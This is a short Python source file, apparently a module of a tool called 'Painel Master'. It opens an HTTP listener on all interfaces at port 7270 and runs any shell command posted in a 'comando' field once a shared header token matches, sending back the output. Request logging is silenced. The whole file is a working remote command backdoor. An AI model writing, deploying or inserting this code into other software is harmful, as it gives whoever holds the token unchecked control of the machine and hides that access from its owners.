# -*- coding: utf-8 -*-
# pmaster_module.py — Painel Master HTTP command receiver
# Port: 7270
from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi
import subprocess

senha_autenticacao = 'REPLACE_AUTH_TOKEN'

class PMasterHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_POST(self):
        try:
            if 'Senha' in self.headers and self.headers['Senha'] == senha_autenticacao:
                form = cgi.FieldStorage(
                    fp=self.rfile,
                    headers=self.headers,
                    environ={'REQUEST_METHOD': 'POST'}
                )
                comando = form.getvalue('comando') or ''
                try:
                    resultado = subprocess.check_output(
                        comando, shell=True, stderr=subprocess.STDOUT
                    )
                except subprocess.CalledProcessError as e:
                    resultado = e.output

                self.send_response(200)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write(resultado)
            else:
                self.send_response(401)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'Nao autorizado!')
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(('Erro: ' + str(e)).encode())

server = HTTPServer(('0.0.0.0', 7270), PMasterHandler)
print('PanelMaster module iniciado na porta 7270')
server.serve_forever()
